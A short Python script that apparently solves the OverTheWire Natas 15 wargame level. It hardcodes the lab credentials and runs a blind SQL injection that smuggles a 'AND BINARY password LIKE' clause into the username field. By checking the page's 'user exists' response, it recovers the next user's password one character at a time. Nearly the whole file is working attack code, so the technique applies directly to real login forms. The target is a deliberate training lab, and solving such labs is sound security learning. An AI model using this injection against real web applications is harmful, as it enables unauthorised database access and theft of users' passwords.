import re
import requests

character = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"



url = "http://natas15.natas.labs.overthewire.org/index.php"

username = "natas15"
password = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"


seen_word = []
session = requests.Session()

while True:
    for ch in character:
        print(f'Password: {"".join(seen_word)+ch}')
        response = session.post(url,data = {"username":'natas16" AND BINARY password LIKE "' + "".join(seen_word) + ch + '%" # ' },auth=(username,password))

        content = response.text
        if "user exists" in content:
            seen_word.append(ch)
        
        